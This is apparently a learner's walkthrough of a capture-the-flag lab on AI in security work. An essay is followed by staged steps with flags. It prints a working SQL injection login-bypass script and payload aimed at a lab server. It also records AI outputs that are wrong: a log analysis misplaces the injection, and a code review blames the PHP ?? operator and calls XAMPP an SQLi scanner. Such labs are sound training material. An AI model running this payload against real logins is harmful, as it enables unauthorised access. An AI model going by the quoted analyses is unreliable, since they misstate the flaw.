# AI Integration in Cybersecurity Workflows
Artificial Intelligence (AI) has rapidly shifted from a conceptual technology to an operational necessity for cybersecurity teams, 
offering a solution to the overwhelming volume of tedious, time-consuming tasks. The imperative now is for security professionals 
to demonstrate competence in deploying and operating these tools, leveraging AI to boost speed and efficiency in core domains. 
The inherent benefits of AI, such as processing massive, heterogeneous datasets, establishing baselines for behavior analysis, 
and using generative models to contextualize complex events, are highly relevant to the demands of modern threat management.

In Defensive Security (Blue Teaming), AI agents function as continuous, automated assistants, significantly accelerating threat 
detection, investigation, and response. They process telemetry—including logs, network flows, and endpoint signals—to enrich 
alerts and identify anomalies invisible to human analysts. This capability is integrated into enterprise solutions like 
AI-assisted firewalling and Intrusion Detection Systems (IDS), enabling real-time automated responses such as isolating 
infected devices or blocking suspicious communications. Conversely, in Offensive Security, AI is utilized to automate the 
labor-intensive initial phases of penetration testing. By handling tasks like open-source intelligence (OSINT), initial 
reconnaissance, and mapping complex attack surfaces from scanner outputs, AI allows the human tester to allocate more time 
to advanced, non-standard exploitation and tasks demanding human judgment.

AI also intersects critically with Software Development security. Though AI-generated code is notorious for introducing 
vulnerabilities—a phenomenon often called "vibe coding"—AI's main secure role is as a virtual auditor. It is highly effective 
when used as a SAST/DAST scanner (Static/Dynamic Application Security Testing) to analyze code and applications for existing 
weaknesses. This creates a clear paradox: AI agents are proficient at identifying flaws but frequently fail to generate secure 
code themselves.

Despite the operational advantages, deploying AI into the security stack demands strict caution. The primary pitfall is the 
assumption of correctness; AI outputs must always be verified by a human analyst. In offensive testing, this is especially 
critical, as uncontrolled AI agents could accidentally cause severe service disruption—like a race condition—which would 
require an untenable explanation to the client. Fundamental concerns remain centered on the data integrity the AI learns 
from, the transparency of its decision-making, and its reliability under novel conditions. Proper management of challenges—such 
as preventing sensitive data leakage, securing the AI models against adversarial attacks, and maintaining human 
accountability—is non-negotiable for responsible deployment.

---
## Activity: When you're ready, you can access Van SolveIT at `http://10.49.131.45`

- open Firefox and search `10.49.131.45`
### Stage 1: Introduction Guidance and Instructions
- Press Complete Stage and Continue

### Stage 2: Red Team Generate Python Scripts for Vulnerabilities 

---
Generated Python script for vulnerabilities using AI:

import requests
#### Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

#### URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

#### Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

#### Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

#### Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)

---
Usage at terminal:
- `ls`
- `vi python.script.py`
 #opens preferred document editor
- paste the generated python script 
- press Esc, then type `:wq!`, finally press Enter to save and exit 
- copy the vulnerable application’s IP Address; `10.49.131.45`
- back to the terminal; run `vi script.py`
- look for url = “http://MACHINE_IP:5000/login.php”
- change to:  url = “http://10.49.131.45:5000/login.php”
- press Esc, then type `:wq!`, finally press Enter to save and exit 
- search using Firefox browser: `http://10.49.131.45:5000`
- you will need the username and password from the script.py you created:
- go back to the terminal and search: `more script.py`
- access:
username = "`alice' OR 1=1 -- -`"
password = "`test`"

- go back to Firefox and login
- FLAG: `THM{SQLI_EXPLOIT}`
- Press Complete Stage and Continue
  
### Stage 3: Blue Team Analyse Logs
- send to AI: analyse logs
- Press Complete Stage and Continue

---
### Output:

AI Assistant
LOG ENTRIES:

198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" 
"username=alice%27+OR+1%3D1+--+-&password=test"
---
### 1. Analysis of the logs
- IP Address: The user\u2019s IP address is 198.51.100.22, indicating they are a potential attacker.
- Time and Date: The attack occurred on 3 October 2025 at 09:03.
- URL: The login page accessed was /login.php.
- Usernam: Alice was attempted, but the SQL injection attempt was in the password parameter.
- SQL Injection: The log shows "username=alice%27+OR+1%3D1+--+-&password=test", indicating that an SQL injection attack was
- attempted using a parameter that was vulnerable to exploitation.
- Conclusion: This log entry highlights a potential security breach in the login process.
---
### 2. Provide this log entry in your response
LOG ENTRIES:
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" 
"username=alice%27+OR+1%3D1+--+-&password=test"
---
### Blue Team Perspective
Detecting such vulnerabilities is critical for identifying potential security issues. This log entry shows that 
the application may have a flaw in handling user inputs, which can be exploited. As a blue team, you would advise developers to:
- Implement input validation and parameter escaping to prevent SQL injection.
- Regularly update systems to patch known vulnerabilities.
- Monitor logs for unusual activity and report suspicious patterns. 

---
### Stage 4: Software
Review source code for vulnerabilities. 
- send yes to AI
- read the output 
- Press Complete Stage and Continue
- get the flag to proceed
- AI output:


AI Assistant

php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

---

1. Identification of the specific vulnerability
The code is vulnerable to SQL injection because it uses ?? to initialize variables $user and $pass. If the POST data is
missing, these variables are set to an empty string, but if the user is trying to input something, the ?? operator does
not actually set the value. This means the input could be used to inject malicious SQL code.

3. Explanation of why the code is vulnerable, in a beginner-oriented way
The ?? operator is a way to initialize a variable. If the POST data is missing, $user and $pass are set to an empty string.
However, if the user is trying to input something, the ?? operator is not actually setting the value. This allows
attackers to inject malicious SQL code by using the input as a parameter.

5. Best practices for preventing similar issues
- Use prepared statements or parameterized queries to prevent SQL injection.
- Ensure that input is escaped and validated before being used in the code.
- Use secure input validation and output encoding to prevent injection attacks.

4. Tools and techniques for code security testing
- Use SQLi scanners like SQLMap or XAMPP.
- Implement input validation and output encoding in your code.
- Use secure coding practices like input sanitization and output encoding.

5. Complete Showcase!
Click "Complete Showcase!" to continue your learning.

Flag: `THM{AI_MANIA}`


>[!Tip]
>You did it! Wareville is one step safer.
>The townsfolk are counting on you to keep Christmas secure.
>Head back to Wareville to continue your mission!



